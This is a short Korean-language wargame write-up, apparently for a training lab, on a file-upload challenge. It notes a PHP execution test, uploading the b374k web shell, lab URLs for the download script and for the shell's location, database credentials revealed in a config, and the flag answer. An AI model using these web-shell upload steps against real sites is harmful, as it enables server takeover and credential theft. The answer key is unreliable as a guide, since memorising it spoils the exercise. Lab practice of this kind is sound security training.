@@ -1,0 +1,24 @@
+===============================
+* 파일 업로드 워게임 문제 8번
+================================
+
+1. 코드
+<?php
+	echo 1+2; (phpinfo)
+?>
+로 확인
+b374k-2.8.php
+
+https://lab.eqst.co.kr:8085/exam31/lib/download.php?file_path=/file/faq/&file_name=aaa.php
+
+파일실행이 됨.
+https://lab.eqst.co.kr:8085/exam31/lib/file/faq/b374k-2.8.php
+
+	/* RealDB	*/	
+	define( "db_host" , "127.0.0.1" ); 
+	define( "db_user" , "db_con_user" );
+	define( "db_pass" , "web_shell_upload" ); 
+	define( "db_db" , "webshell_db" );
+2. 정답
+web_shell_upload
+================================
